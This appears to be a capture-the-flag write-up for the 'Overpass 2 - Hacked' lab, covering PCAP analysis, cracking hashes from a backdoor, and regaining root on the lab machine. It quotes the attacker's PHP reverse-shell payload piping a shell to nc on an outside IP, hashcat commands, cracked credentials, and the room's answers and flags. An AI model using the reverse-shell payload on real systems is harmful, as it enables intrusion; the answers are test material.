# Overpass 2 - Hacked - Easy

1. [Forensics - Analyse the PCAP](#forensics---analyse-the-pcap)
2. [Research - Analyse the code](#research---analyse-the-code)
3. [Attack - Get back in](#attack---get-back-in)

## Forensics - Analyse the PCAP

```markdown
We are given a PCAP file with md5sum: 11c3b2e9221865580295bc662c35c6dc

We need to analyze it by opening it on Wireshark.

The first POST request in the packet file shows that a reverse shell was uploaded to /development/upload.php

In order to view what payload was uploaded, we can navigate to Analyze > Follow > HTTP Stream. This shows us the PHP payload used to gain access.

As the payload contains the port 4242, we can use filter 'tcp.port == 4242' in Wireshark, and follow the TCP stream to get password used.

In the same stream, we can view the tool used to maintain persistence, and the dumped shadow list.

This list contains hashes for five users, and all hashes are of type sha512crypt $6$.

Using hashcat and the fasttrack wordlist, we are able to crack 4 out of 5 hashes.

Creds - paradox:secuirty3, bee:secret12, szymex:abcd123, muirland:1qaz2wsx
```

```shell
hashcat -m 1800 -a 0 manyhashes.txt /usr/share/wordlists/fasttrack.txt
#cracking hashes
```

```markdown
1. What was the URL of the page they used to upload a reverse shell? - /development/

2. What payload did the attacker use to gain access? - <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

3. What password did the attacker use to privesc? - whenevernoteartinstant

4. How did the attacker establish persistence? - https://github.com/NinjaJc01/ssh-backdoor

5. Using the fasttrack wordlist, how many of the system passwords were crackable? - 4
```

## Research - Analyse the code

```markdown
Now, we have to refer the backdoor code we found earlier at <https://github.com/NinjaJc01/ssh-backdoor>

The main.go file contains the code, which includes the hash.

The code also contains a hardcoded salt in the function passwordHandler()

Now, we need to check the hash used by the attacker, for which we need to go back to the PCAP file.

The hash used by attacker can be viewed in the same TCP stream as the backdoor.

As we have both hash and salt now, we can attempt to crack it using Hashcat.

The hash is of type sha512, and when cracked it gives the password 'november16'
```

```markdown
1. What's the default hash for the backdoor? - bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

2. What's the hardcoded salt for the backdoor? - 1c362db832f3f864c8c2fe05f2002a05

3. What was the hash that the attacker used? - 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

4. Crack the hash. What's the password? - november16
```

## Attack - Get back in

```shell
nmap -T4 -p- -A 10.10.89.247

ssh james@10.10.89.247 -p 2222

cd ..

ls -la

./.suid_bash

./.suid_bash -p
```

```markdown
From the nmap scan, we can see that there are two ports for SSH - one on port 22 and the other on port 2222.

We know that the SSH backdoor is on port 2222 so we will use that for login.

Checking the website on port 80, we can see that it has been defaced.

We can use the creds james:november16 to SSH into the machine.

User flag can be found in /home/james.

There is a hidden file in the home directory called .suid_bash, which generates a bash shell.

The bash shell can be used for privesc by using the -p option for privileged mode.

Root flag can be found in /root.
```

```markdown
1. The attacker defaced the website. What message did they leave as a heading? - H4ck3d by CooctusClan

2. What's the user flag? - thm{d119b4fa8c497ddb0525f7ad200e6567}

3. What's the root flag? - thm{d53b2684f169360bb9606c333873144d}
```
